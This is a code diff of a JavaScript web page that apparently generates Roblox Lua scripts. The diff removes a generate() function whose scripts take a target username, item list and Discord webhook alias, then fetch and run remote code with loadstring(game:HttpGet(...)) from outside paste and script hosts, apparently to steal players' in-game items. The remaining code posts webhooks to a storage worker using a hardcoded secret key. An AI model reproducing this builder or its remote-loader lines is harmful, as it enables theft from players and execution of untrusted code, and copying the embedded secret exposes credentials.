@@ -849,13 +849,14 @@ function updateCustomAdmin() {
 
 
     const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'
-      },
-      body: JSON.stringify({ alias, url: webhook })
-    });
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1',
+  },
+  body: JSON.stringify({ alias, url: webhook }),
+  mode: 'cors', // <-- Add this line
+});
 
     if (!kvResponse.ok) throw new Error('Failed to store webhook.');
 
@@ -1072,89 +1073,6 @@ function validateWebhook() {
   }
 }
 
-async function generate() {
-  const btn = document.querySelector('.btn-gen');
-  const out = document.getElementById('outputBlock');
-
-  if (btn.disabled) return;
-  btn.disabled = true;
-  btn.textContent = '⏳ Generating...';
-  btn.style.opacity = '0.6';
-
-  try {
-    const username = document.getElementById('usernameInput').value.trim();
-    const webhook = document.getElementById('webhookInput').value.trim();
-
-    if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
-    if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
-    if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
-
-    const alias = generateAlias();
-
-
-    const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'
-      },
-      body: JSON.stringify({ alias, url: webhook })
-    });
-
-    if (!kvResponse.ok) throw new Error('Failed to store webhook.');
-
-    const names = [...selected];
-    const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
-
-    let adminScriptPart = '';
-    if (adminMode === 'admin-panel') {
-      adminScriptPart = `
-task.spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
-end)
-`;
-    } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-      adminScriptPart = `
-task.spawn(function()`
-    customAdminLoadstring
-`end)
-`;
-    }
-
-    const script = `getgenv().WEBHOOK_URL = "${alias}"
-getgenv().TARGET_USERNAME = "${username}"
-getgenv().TARGET_BRAINROT = {
-${brainrotLines}
-}
-task.spawn(function()
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))()
-end)
-${adminScriptPart}
-`;
-
-
-    const pastefyRawUrl = await uploadToPastefy(script);
-
-    if (pastefyRawUrl) {
-      out.className = 'code-block';
-      out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
-    } else {
-      out.className = 'code-block';
-      out.textContent = `${script}`;
-    }
-
-  } catch (err) {
-    console.error(err);
-    out.className = 'code-block empty';
-    out.textContent = err.message || 'An error occurred.';
-  } finally {
-    setTimeout(() => {
-      btn.disabled = false;
-      btn.textContent = '⚡ Generate Script';
-      btn.style.opacity = '1';
-    }, 1500);
-  }
-}
 
 function copyOut() {
   const code = document.getElementById('outputBlock').textContent;
